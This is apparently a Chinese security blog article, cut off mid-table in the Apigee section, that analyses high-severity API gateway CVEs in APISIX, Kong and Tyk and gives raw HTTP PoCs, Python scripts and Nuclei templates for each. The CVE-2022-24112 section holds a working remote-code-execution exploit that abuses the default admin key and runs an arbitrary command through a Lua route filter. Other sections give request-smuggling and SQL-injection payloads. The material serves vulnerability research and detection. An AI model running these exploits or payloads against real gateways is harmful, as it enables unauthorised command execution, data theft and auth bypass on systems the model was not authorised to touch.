---
title: "API安全网关与防护平台高危攻击链专题：APISIX / Kong / Tyk / Apigee / NGINX / Azure APIM 漏洞全解析"
date: 2026-07-23T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["API", "网关", "APISIX", "Kong", "Tyk", "Apigee", "NGINX", "Azure APIM", "CVE-2022-24112", "RCE", "认证绕过", "漏洞分析"]
---

> **⚠️ 安全免责声明**
>
> 本文仅用于安全研究与教育目的。文中提供的 PoC、Nuclei 模板和攻击脚本仅供授权安全测试使用。未经授权对他人系统实施攻击属于违法行为。作者不对任何因滥用本文内容造成的结果负责。请在获得书面授权后方可进行实际测试。

## 0x00 专题概述

API 网关（API Gateway）是现代云原生应用架构的核心基础设施，承担着流量路由、认证鉴权、限流熔断、协议转换、日志审计等关键职能。作为客户端与后端微服务之间的唯一入口，API 网关天然处于安全边界的关键位置——它既是抵御外部攻击的第一道防线，也是内部服务之间信任链的锚点。一旦 API 网关本身存在安全漏洞，攻击者便可绕过所有上层安全机制，直接渗透至核心业务系统。

近年来，随着企业 API 经济的快速发展，API 网关产品的使用量呈爆发式增长。Apache APISIX、Kong Gateway、Tyk Gateway、Google Apigee/Apigee-X、F5 NGINX 以及 Azure API Management 等产品在全球范围内被广泛部署。与此同时，这些产品的安全漏洞也持续被安全研究人员发现和披露。从 2021 年的 Kong JWT 路径穿越，到 2022 年的 APISIX batch-requests RCE（已被 CISA KEV 收录），再到 2025-2026 年的 Apigee 跨租户数据访问和 NGINX HTTP/3 UAF，API 网关安全漏洞的影响力和攻击复杂度不断提升。

本专题系统性地梳理了 2021-2026 年间六大主流 API 网关/防护平台的高危安全漏洞（共覆盖 12 个 CVE 或漏洞集群），深入分析每个漏洞的技术原理与攻击链，提供可直接运行的检测 PoC 和 Nuclei 模板，并从共性攻击模式的角度总结 API 网关安全加固建议。

### 覆盖漏洞一览表

| CVE 编号 | 厂商/产品 | CVSS | 漏洞类型 | 未授权利用 | 在野利用 |
|---|---|---|---|---|---|
| CVE-2022-24112 | Apache APISIX | 9.8 CRITICAL | 认证绕过 → RCE | 是 | 是（KEV） |
| CVE-2021-45232 | Apache APISIX Dashboard | 9.8 CRITICAL | 未授权访问 | 是 | 否 |
| CVE-2022-29266 | Apache APISIX | 7.5 HIGH | 信息泄露 | 是 | 否 |
| CVE-2024-32638 | Apache APISIX | 6.3 MEDIUM | HTTP 请求走私 | 是 | 否 |
| CVE-2021-27306 | Kong Gateway Enterprise | 7.5 HIGH | 路径穿越认证绕过 | 是 | 否 |
| CVE-2023-42283 | Tyk Gateway | 9.8 CRITICAL | SQL 注入 | 是 | 否 |
| CVE-2025-13426 | Google Apigee Hybrid | 8.7 HIGH | 动态代码执行 → RCE | 否（需部署权限） | 否 |
| CVE-2025-13292 | Google Apigee-X | 7.6 HIGH | 跨租户数据访问 | 否（需 GCP 权限） | 否 |
| CVE-2023-44487 | HTTP/2 生态（含网关） | 7.5 HIGH | 协议级 DoS | 是 | 是（3.98 亿 RPS） |
| CVE-2026-42530 | F5 NGINX Open Source | 8.1 HIGH | UAF → RCE/DoS | 是 | 否 |
| CVE-2026-42055 | F5 NGINX Plus/Open Source | 8.1 HIGH | 堆缓冲区溢出 → RCE/DoS | 是 | 否 |
| Azure APIM 漏洞集群 | Azure API Management | ~7.5-9.0 | SSRF + 权限提升 | 否（需 Azure 认证） | 否 |

---

## 0x01 Apache APISIX 高危漏洞

Apache APISIX 是 Apache 软件基金会孵化的动态、实时云原生 API 网关，基于 OpenResty/Nginx 构建，支持 Lua 插件和 Wasm 插件扩展。因其开源、高性能和丰富的插件生态，在国内外企业中被广泛采用。然而，APISIX 的 Admin API 管理接口、插件系统和 Dashboard 在过去数年间暴露了多个严重漏洞。

### 0x01.1 CVE-2022-24112 — batch-requests 插件 IP 限制绕过 RCE

**漏洞背景**

CVE-2022-24112 是 Apache APISIX 历史上最严重的安全漏洞之一，CVSS 3.1 评分 9.8（Critical），已被 CISA 已知被利用漏洞目录（KEV）于 2022 年 8 月 25 日收录。该漏洞由 API 安全公司 Salt Security 发现并报告，影响 APISIX 2.10.0~2.10.4 和 2.11.0~2.12.1 版本。漏洞的公开 PoC（M4xSec/Apache-APISIX-CVE-2022-24112）和 Metasploit 模块已被广泛传播。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
| APISIX 2.10.0 ~ 2.10.4 | 受影响 |
| APISIX 2.11.0 ~ 2.12.1 | 受影响 |
| APISIX 2.10.4 / 2.12.1+ | 已修复 |

**漏洞原理分析**

Apache APISIX 的 Admin API 默认绑定在 `9180` 端口，并通过 `ip-restriction` 插件限制仅允许管理员 IP（默认 `127.0.0.1`）访问。同时，`batch-requests` 插件允许客户端通过单个 HTTP 请求批量发送多个子请求，APISIX 会在服务端依次处理这些子请求。

漏洞的核心在于：`batch-requests` 插件在处理批量请求时，会读取每个子请求中的 `X-REAL-IP` 或 `X-Forwarded-For` 请求头来确定客户端 IP，并将该 IP 传递给后续的 `ip-restriction` 插件进行校验。攻击者可以在 batch 请求的一个子请求中设置 `X-REAL-IP: 127.0.0.1`，使 APISIX 将该请求视为来自本地的管理请求，从而绕过 IP 限制。

更危险的是，如果目标 APISIX 实例使用了默认配置（默认 Admin Key `edd1c9f034335f136f87ad84b625c8f1` + 未修改管理端口 `9180`），攻击者可以利用绕过后的权限调用 Admin API 创建恶意路由。通过路由的 `filter_func` 字段注入 Lua 代码，即可在网关服务器上执行任意系统命令，实现完整的 Remote Code Execution。

攻击链如下：

1. 攻击者向 APISIX 的 9080 端口发送 batch-requests 请求
2. 子请求 1：向 `127.0.0.1:9180` 发送 POST 请求创建恶意路由，`X-REAL-IP` 设为 `127.0.0.1`
3. 子请求 2：访问新创建的路由，触发 `filter_func` 中的 Lua 代码执行
4. 后端执行 `os.execute()` 实现 RCE

**HTTP PoC**

```http
POST /api/batch-requests HTTP/1.1
Host: target.com:9080
Content-Type: application/json

{
  "pipeline": [
    {
      "method": "POST",
      "path": "apisix/admin/routes",
      "headers": {
        "X-REAL-IP": "127.0.0.1",
        "Content-Type": "application/json",
        "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1"
      },
      "body": "{\"uri\":\"/*\",\"filter_func\":\"function(vars) os.execute('id > /tmp/pwned'); return false end\",\"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"127.0.0.1:80\":1}}}"
    }
  ]
}
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2022-24112 Apache APISIX batch-requests IP Restriction Bypass RCE"""
import requests
import json
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def exploit(target, command="id", api_key="edd1c9f034335f136f87ad84b625c8f1"):
    base_url = target.rstrip("/")
    batch_endpoint = f"{base_url}/api/batch-requests"

    route_body = {
        "uri": "/pwned_test",
        "filter_func": (
            f"function(vars) "
            f"os.execute('{command}'); "
            f"return false end"
        ),
        "upstream": {
            "type": "roundrobin",
            "nodes": {"127.0.0.1:80": 1},
        },
    }

    payload = {
        "pipeline": [
            {
                "method": "POST",
                "path": "apisix/admin/routes",
                "headers": {
                    "X-REAL-IP": "127.0.0.1",
                    "Content-Type": "application/json",
                    "X-API-KEY": api_key,
                },
                "body": json.dumps(route_body),
            }
        ]
    }

    try:
        resp = requests.post(
            batch_endpoint,
            json=payload,
            timeout=10,
            verify=False,
            headers={"Content-Agent": "APISIX CVE-2022-24112 PoC"},
        )
        print(f"[+] Status: {resp.status_code}")
        print(f"[+] Response: {resp.text[:500]}")
        if resp.status_code == 200:
            print("[+] Exploit may have succeeded - check /tmp/pwned for output")
        return resp
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None


def cleanup(target, route_id="pwned_test", api_key="edd1c9f034335f136f87ad84b625c8f1"):
    base_url = target.rstrip("/")
    delete_url = f"{base_url}/apisix/admin/routes/{route_id}"
    try:
        resp = requests.delete(
            delete_url,
            headers={"X-API-KEY": api_key},
            timeout=10,
            verify=False,
        )
        print(f"[+] Cleanup: {resp.status_code}")
    except requests.RequestException:
        pass


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [command] [api_key]")
        sys.exit(1)
    target = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
    key = sys.argv[3] if len(sys.argv) > 3 else "edd1c9f034335f136f87ad84b625c8f1"
    exploit(target, cmd, key)
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2022-24112

info:
  name: Apache APISIX batch-requests IP Restriction Bypass RCE
  author: x7peeps
  severity: critical
  description: |
    Apache APISIX batch-requests plugin allows IP restriction bypass via
    X-REAL-IP header manipulation, enabling unauthorized Admin API access
    and potential RCE through malicious route creation.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-24112
    - https://apisix.apache.org/blog/2022/01/27/cve-2022-24112/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-24112
    cwe-id: CWE-290
  tags: cve,cve2022,apisix,rce,bypass

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/batch-requests"

    headers:
      Content-Type: application/json

    body: |
      {"pipeline":[{"method":"GET","path":"apisix/admin/routes","headers":{"X-REAL-IP":"127.0.0.1","X-API-KEY":"edd1c9f034335f136f87ad84b625c8f1"}}]}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "list"
          - "node"
        condition: or

      - type: status
        status:
          - 200
```

### 0x01.2 CVE-2021-45232 — Dashboard 未授权访问

**漏洞背景**

CVE-2021-45232 是 Apache APISIX Dashboard 中的未授权访问漏洞，CVSS 3.1 评分 9.8（Critical）。该漏洞由 Vicarius 安全研究人员发现并披露，影响 APISIX Dashboard 2.7~2.10 版本。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
| APISIX Dashboard 2.7 ~ 2.10 | 受影响 |
| APISIX Dashboard 2.10.1+ | 已修复 |

**漏洞原理分析**

APISIX Dashboard 的 Manager API 同时使用了 droplet 和 gin 两个 HTTP 框架。Dashboard 的认证中间件基于 droplet 框架开发，通过 droplet 的路由拦截器对所有 API 请求进行认证检查。然而，Dashboard 中的部分 API 端点（尤其是 `/api/internal/admin/` 前缀下的管理接口）直接使用 gin 框架注册路由，完全绕过了 droplet 框架的认证中间件。

这种框架混用导致了一个致命缺陷：攻击者可以直接调用这些 gin 框架注册的 API 端点，无需任何认证令牌即可执行管理操作。攻击者可以通过 `/api/internal/admin/routes/list` 获取所有路由配置，通过 `/api/internal/admin/upstreams/list` 获取上游配置，甚至通过 `/api/internal/admin/ssls/list` 获取 SSL 证书信息。

**HTTP PoC**

```http
GET /api/internal/admin/routes/list HTTP/1.1
Host: target-dashboard.com:9000
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2021-45232 Apache APISIX Dashboard Unauthorized Access"""
import requests
import json
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target):
    endpoints = [
        "/api/internal/admin/routes/list",
        "/api/internal/admin/upstreams/list",
        "/api/internal/admin/ssls/list",
    ]
    base_url = target.rstrip(":")
    if not base_url.endswith(":9000"):
        base_url += ":9000"

    findings = []
    for ep in endpoints:
        try:
            resp = requests.get(
                f"{base_url}{ep}",
                timeout=10,
                verify=False,
                headers={"User-Agent": "Mozilla/5.0 (Dashboard PoC)"},
            )
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    findings.append({"endpoint": ep, "data_preview": json.dumps(data)[:200]})
                except json.JSONDecodeError:
                    findings.append({"endpoint": ep, "data_preview": resp.text[:200]})
        except requests.RequestException:
            continue

    return findings


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_dashboard>")
        sys.exit(1)
    results = check(sys.argv[1])
    if results:
        print(f"[+] CVE-2021-45232 Vulnerable! Found {len(results)} exposed endpoints:")
        for r in results:
            print(f"    {r['endpoint']}")
            print(f"    Preview: {r['data_preview']}")
    else:
        print("[-] Not Vulnerable or endpoints not accessible")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2021-45232

info:
  name: Apache APISIX Dashboard Unauthorized Access
  author: x7peeps
  severity: critical
  description: |
    APISIX Dashboard Manager API authentication bypass due to mixed
    droplet/gin framework routing, allowing unauthenticated access to
    admin endpoints.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-45232
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.8
    cve-id: CVE-2021-45232
    cwe-id: CWE-306
  tags: cve,cve2021,apisix,dashboard,unauth

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/internal/admin/routes/list"
      - "{{BaseURL}}/api/internal/admin/upstreams/list"
      - "{{BaseURL}}/api/internal/admin/ssls/list"

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "total"
          - "list"
        condition: and

      - type: status
        status:
          - 200
```

### 0x01.3 CVE-2022-29266 — jwt-auth 插件密钥泄露

**漏洞背景**

CVE-2022-29266 是 Apache APISIX jwt-auth 插件中的信息泄露漏洞，CVSS 3.1 评分 7.5（HIGH）。该漏洞由 Apache 官方安全团队发现并披露，影响 APISIX ≤ 2.13.0 的所有版本。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
| APISIX ≤ 2.13.0 | 受影响 |
| APISIX 2.13.1+ | 已修复 |

**漏洞原理分析**

APISIX 的 `jwt-auth` 插件在验证 JWT 令牌时，如果验证失败（签名不匹配、令牌过期或格式错误），会返回一个包含详细错误信息的 401 响应。问题在于，错误响应的 `message` 字段中包含了用户的 secret key（即用于签发 JWT 的密钥）。

攻击者可以利用此信息泄露获取合法用户的密钥，然后使用该密钥签发伪造的 JWT 令牌，以合法用户身份访问受保护的 API 端点。这形成了一个完整的认证绕过链：**信息泄露 → 密钥获取 → 令牌伪造 → 认证绕过**。

具体来说，当 JWT 验证失败时，APISIX 内部 Lua 代码会将 `secret` 变量拼接到错误消息中返回。攻击者通过发送一个格式正确但签名无效的 JWT，即可从 401 响应中提取出用于验证的密钥。

**HTTP PoC**

```http
GET /protected-api HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ0ZXN0IjoxfQ.INVALID_SIGNATURE
```

返回的 401 响应中 `message` 字段将包含 secret key。

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2022-29266 APISIX jwt-auth Secret Key Leak Detection"""
import requests
import base64
import json
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def leak_secret(target, protected_path="/"):
    base_url = target.rstrip("/")
    url = f"{base_url}{protected_path}"

    header = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(json.dumps({"test": 1}).encode()).rstrip(b"=").decode()
    fake_jwt = f"{header}.{payload}.invalid"

    try:
        resp = requests.get(
            url,
            headers={"Authorization": f"Bearer {fake_jwt}"},
            timeout=10,
            verify=False,
        )
        if resp.status_code == 401:
            body = resp.text
            try:
                data = resp.json()
                msg = data.get("message", "") or data.get("error", "")
            except json.JSONDecodeError:
                msg = body
            if "key" in msg.lower() or "secret" in msg.lower():
                return True, msg
        return False, resp.text[:200]
    except requests.RequestException as e:
        return False, str(e)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [protected_path]")
        sys.exit(1)
    path = sys.argv[2] if len(sys.argv) > 2 else "/"
    vuln, info = leak_secret(sys.argv[1], path)
    if vuln:
        print(f"[+] CVE-2022-29266 Vulnerable! Secret leaked in response:")
        print(f"    {info}")
    else:
        print(f"[-] Not Vulnerable or not exploitable: {info}")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2022-29266

info:
  name: Apache APISIX jwt-auth Secret Key Leak
  author: x7peeps
  severity: high
  description: |
    APISIX jwt-auth plugin leaks the secret key in error responses when
    JWT verification fails, enabling token forgery and auth bypass.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-29266
    - https://apisix.apache.org/blog/2022/06/27/cve-2022-29266/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-29266
    cwe-id: CWE-200
  tags: cve,cve2022,apisix,jwt,information-disclosure

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    headers:
      Authorization: "Bearer eyJhbGciOiJIUzI1NiJ9.eyJ0ZXN0IjoxfQ.invalid"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "key"
          - "secret"
          - "signature"
        condition: or

      - type: status
        status:
          - 401
```

### 0x01.4 CVE-2024-32638 — forward-auth 插件 HTTP 请求走私

**漏洞背景**

CVE-2024-32638 是 Apache APISIX forward-auth 插件中的 HTTP 请求走私漏洞，CVSS 3.1 评分 6.3（MEDIUM）。该漏洞由 Apache 官方安全团队于 2024 年披露，影响 APISIX 3.8.0 和 3.9.0 版本。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
| APISIX 3.8.0 | 受影响 |
| APISIX 3.9.0 | 受影响 |
| APISIX 3.8.1 / 3.9.1+ | 已修复 |

**漏洞原理分析**

`forward-auth` 插件用于将原始请求的某些信息转发到外部授权服务进行鉴权。当 APISIX 与上游授权服务之间存在 HTTP 解析不一致时，攻击者可以构造特殊请求实施 HTTP 请求走私攻击。

具体而言，APISIX 在与上游授权服务通信时，HTTP 请求的构建和解析过程存在缺陷。攻击者可以通过构造包含特殊 `Transfer-Encoding` 头或 `Content-Length` 头不一致的请求，使得 APISIX 和上游服务器对请求边界的理解产生偏差。这种偏差可能导致：

- **请求走私**：将一个请求隐藏在另一个请求中，绕过安全检查
- **缓存投毒**：污染 APISIX 的缓存，使其他用户收到恶意响应
- **会话劫持**：访问其他用户的会话数据

**HTTP PoC**

```http
POST /api/protected HTTP/1.1
Host: target.com
Content-Type: application/json
Transfer-Encoding: chunked
Content-Length: 60

0

GET /admin/internal HTTP/1.1
Host: target.com

```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2024-32638 APISIX forward-auth HTTP Request Smuggling Detection"""
import requests
import sys
import socket
import ssl
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target):
    url = target.rstrip("/")
    try:
        normal_resp = requests.get(
            f"{url}/",
            timeout=10,
            verify=False,
            allow_redirects=False,
        )
        normal_status = normal_resp.status_code
    except requests.RequestException:
        normal_status = None

    smuggled_body = (
        "0\r\n"
        "\r\n"
        "GET /nonexistent_smuggle_test HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "\r\n"
    )

    try:
        resp = requests.post(
            f"{url}/",
            data=smuggled_body,
            headers={
                "Transfer-Encoding": "chunked",
                "Content-Type": "application/json",
            },
            timeout=10,
            verify=False,
            allow_redirects=False,
        )
        if resp.status_code in (400, 411, 502):
            return True
        if resp.status_code == normal_status:
            return False
        return True
    except requests.RequestException:
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    result = check(sys.argv[1])
    status = "Vulnerable" if result else "Not Vulnerable"
    print(f"[{'+' if result else '-'}] CVE-2024-32638 APISIX forward-auth Smuggling: {status}")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2024-32638

info:
  name: Apache APISIX forward-auth HTTP Request Smuggling
  author: x7peeps
  severity: medium
  description: |
    APISIX forward-auth plugin has HTTP parsing inconsistency with
    upstream authorization services, enabling request smuggling attacks.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-32638
    - https://apisix.apache.org/blog/2024/07/cve-2024-32638/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 6.3
    cve-id: CVE-2024-32638
    cwe-id: CWE-444
  tags: cve,cve2024,apisix,request-smuggling

http:
  - method: POST
    path:
      - "{{BaseURL}}/"

    headers:
      Transfer-Encoding: "chunked"
      Content-Type: application/json

    body: "0\r\n\r\nGET /nonexistent_smuggle_test HTTP/1.1\r\nHost: target.com\r\n\r\n"

    matchers:
      - type: status
        status:
          - 400
          - 411
          - 502
```

---

## 0x02 Kong Gateway 高危漏洞

Kong Gateway 是基于 OpenResty/Nginx 构建的商业级 API 网关，由 Kong Inc. 维护，是全球使用最广泛的 API 网关之一。Kong 的插件生态系统提供了丰富的认证、限流、日志等功能，但也带来了更大的攻击面。

### 0x02.1 CVE-2021-27306 — JWT 插件路径穿越认证绕过

**漏洞背景**

CVE-2021-27306 是 Kong Gateway Enterprise 中的路径穿越认证绕过漏洞，CVSS 3.1 评分 7.5（HIGH）。该漏洞由安全研究人员通过漏洞赏金计划发现并报告，影响 Kong Gateway Enterprise < 2.3.2.0 的版本。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
| Kong Gateway Enterprise < 2.3.2.0 | 受影响 |
| Kong Gateway Enterprise ≥ 2.3.2.0 | 已修复 |

**漏洞原理分析**

该漏洞的触发需要满足两个前提条件：

1. Kong 配置了 JWT 插件来保护某些路由（如 `/api/v1/customers`）
2. 同一 Kong 实例上存在不需要认证的公开路由（如 `/public`）

Kong 在处理请求时使用路径匹配来确定应应用哪些插件。路径匹配基于规范化后的 URL 路径。攻击者可以通过构造路径穿越序列来操纵 Kong 看到的最终路径，使其匹配到不需要认证的路由规则。

例如，假设配置如下：
- `/public` → 无认证要求，转发到静态页面服务
- `/api/v1/customers` → 需要 JWT 认证，转发到客户数据 API

攻击者构造请求：`GET /public/../api/v1/customers`

Kong 在规范化路径后会将其解析为 `/api/v1/customers`，但在路由匹配阶段，Kong 首先将 `/public/../api/v1/customers` 与路由规则进行前缀匹配。由于路径以 `/public` 开头，Kong 将其匹配到公开路由并转发至静态页面服务。然而，后端静态页面服务在收到 `/public/../api/v1/customers` 后会对其进行路径规范化，最终将请求转发到客户数据 API——且该请求不携带任何 JWT 令牌。

更复杂的情况下，某些后端实现会在路径规范化后将请求重新路由回 Kong，而此时 Kong 已经在第一次匹配时跳过了 JWT 认证检查，导致请求以未认证状态到达受保护的后端端点。

**HTTP PoC**

```http
GET /public/../api/v1/customers HTTP/1.1
Host: target-kong.com
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2021-27306 Kong JWT Path Traversal Auth Bypass Detection"""
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, public_path="/public", protected_path="/api/v1/customers"):
    base_url = target.rstrip("/")
    paths_to_test = [
        f"{public_path}/../{protected_path.lstrip('/')}",
        f"{public_path}/..{protected_path}",
        f"{public_path}%2f..%2f{protected_path.lstrip('/')}",
        f"{public_path}/%2e%2e{protected_path}",
    ]

    for traversal_path in paths_to_test:
        try:
            resp = requests.get(
                f"{base_url}{traversal_path}",
                timeout=10,
                verify=False,
                allow_redirects=False,
            )
            if resp.status_code == 200:
                content_type = resp.headers.get("Content-Type", "")
                if "json" in content_type or "api" in content_type.lower():
                    return True, traversal_path, resp.status_code
                body_preview = resp.text[:200]
                if "customer" in body_preview.lower() or "user" in body_preview.lower():
                    return True, traversal_path, resp.status_code
        except requests.RequestException:
            continue

    return False, None, None


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [public_path] [protected_path]")
        sys.exit(1)
    pub = sys.argv[2] if len(sys.argv) > 2 else "/public"
    prot = sys.argv[3] if len(sys.argv) > 3 else "/api/v1/customers"
    vuln, path, code = check(sys.argv[1], pub, prot)
    if vuln:
        print(f"[+] CVE-2021-27306 Vulnerable!")
        print(f"    Bypass path: {path} -> Status: {code}")
    else:
        print("[-] Not Vulnerable or paths not matching")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2021-27306

info:
  name: Kong Gateway JWT Path Traversal Auth Bypass
  author: x7peeps
  severity: high
  description: |
    Kong Gateway Enterprise JWT plugin can be bypassed via path traversal
    sequences that match unprotected routes before reaching protected ones.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-27306
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-27306
    cwe-id: CWE-706
  tags: cve,cve2021,kong,jwt,path-traversal,bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/public/../api/v1/customers"
      - "{{BaseURL}}/public/..%2fapi/v1/customers"
      - "{{BaseURL}}/public/%2e%2e/api/v1/customers"

    matchers:
      - type: status
        status:
          - 200
```

---

## 0x03 Tyk Gateway 高危漏洞

Tyk Gateway 是一款开源的 API 网关和管理平台，支持 REST、GraphQL、gRPC 等多种协议。Tyk 使用 Go 语言开发，内置了丰富的 API 生命周期管理功能。

### 0x03.1 CVE-2023-42283 — 错误统计 API SQL 注入

**漏洞背景**

CVE-2023-42283 是 Tyk Gateway 中的严重 SQL 注入漏洞，CVSS 3.1 评分 9.8（Critical）。该漏洞由安全研究人员通过 GitHub PoC（andreysanyuk/CVE-2023-42283）公开披露，影响 Tyk Gateway 5.0.3 版本。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
| Tyk Gateway 5.0.3 | 受影响 |
| Tyk Gateway 5.0.7+ | 已修复 |

**漏洞原理分析**

Tyk Gateway 提供了一个错误统计 API 端点 `/api/errors/count/`，用于查询 API 错误的统计数据。该端点接受一个 `api_id` 参数来过滤特定 API 的错误记录。问题在于，`api_id` 参数的值被直接拼接到 SQL 查询语句中，未经过任何参数化处理或输入验证。

由于该端点不需要认证即可访问，攻击者可以构造恶意的 SQL 注入 payload 通过 `api_id` 参数注入到后端数据库查询中。这是一个典型的盲注（blind injection）场景——攻击者无法直接在响应中看到查询结果，但可以通过基于布尔或时间的盲注技术逐步提取数据库中的数据。

攻击者可以通过以下步骤实现完整利用：

1. 确认注入点：发送 `api_id=1' AND '1'='1` 和 `api_id=1' AND '1'='2`，观察响应差异
2. 提取数据：使用时间盲注 `api_id=1' AND IF(SUBSTRING((SELECT database()),1,1)='t',SLEEP(5),0)--`
3. 获取数据库结构和敏感数据

**HTTP PoC**

```http
GET /api/errors/count/1' UNION SELECT 1,2,3,4-- HTTP/1.1
Host: target-tyk.com:8080
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2023-42283 Tyk Gateway SQL Injection Detection"""
import requests
import sys
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_boolean_blind(target):
    base_url = target.rstrip("/")
    url = f"{base_url}/api/errors/count/"

    true_payload = "1' AND '1'='1"
    false_payload = "1' AND '1'='2"

    try:
        t1 = time.time()
        resp_true = requests.get(
            f"{url}{true_payload}",
            timeout=15,
            verify=False,
        )
        time_true = time.time() - t1

        t2 = time.time()
        resp_false = requests.get(
            f"{url}{false_payload}",
            timeout=15,
            verify=False,
        )
        time_false = time.time() - t2

        if resp_true.status_code != resp_false.status_code:
            return True

        if resp_true.text != resp_false.text:
            return True

        if abs(time_true - time_false) > 3.0:
            return True

        return False
    except requests.RequestException:
        return False


def check_union(target):
    base_url = target.rstrip("/")
    url = f"{base_url}/api/errors/count/"

    payloads = [
        "1 UNION SELECT 1,2,3,4--",
        "1' UNION SELECT NULL,NULL,NULL,NULL--",
    ]

    for payload in payloads:
        try:
            resp = requests.get(
                f"{url}{payload}",
                timeout=10,
                verify=False,
            )
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, dict) and data.get("rows"):
                        return True
                except Exception:
                    pass
        except requests.RequestException:
            continue

    return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    target = sys.argv[1]
    vuln = check_boolean_blind(target) or check_union(target)
    if vuln:
        print(f"[+] CVE-2023-42283 Vulnerable! SQL Injection in /api/errors/count/")
    else:
        print("[-] Not Vulnerable or not exploitable")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2023-42283

info:
  name: Tyk Gateway SQL Injection in Error Count API
  author: x7peeps
  severity: critical
  description: |
    Tyk Gateway /api/errors/count/ endpoint is vulnerable to unauthenticated
    SQL injection via the api_id parameter, enabling database access.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-42283
    - https://github.com/andreysanyuk/CVE-2023-42283
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-42283
    cwe-id: CWE-89
  tags: cve,cve2023,tyk,sqli,unauth

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/errors/count/1' AND '1'='1"
      - "{{BaseURL}}/api/errors/count/1' AND '1'='2"

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "count"
          - "rows"
        condition: or

      - type: status
        status:
          - 200
          - 500
```

---

## 0x04 Google Apigee/Apigee-X 高危漏洞

Google Apigee 是 Google Cloud 平台上的全托管 API 管理解决方案，分为 Apigee Hybrid（混合部署）和 Apigee-X（全托管 SaaS）两个版本。Apigee 在企业 API 管理市场中占据重要地位，其安全漏洞直接影响大量企业客户。

### 0x04.1 CVE-2025-13426 — JavaCallout RCE

**漏洞背景**

CVE-2025-13426 是 Google Apigee Hybrid 中的远程代码执行漏洞，CVSS 3.1 评分 8.7（HIGH）。该漏洞影响 Apigee Hybrid 的多个版本分支，需要攻击者具有 API 代理部署权限。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
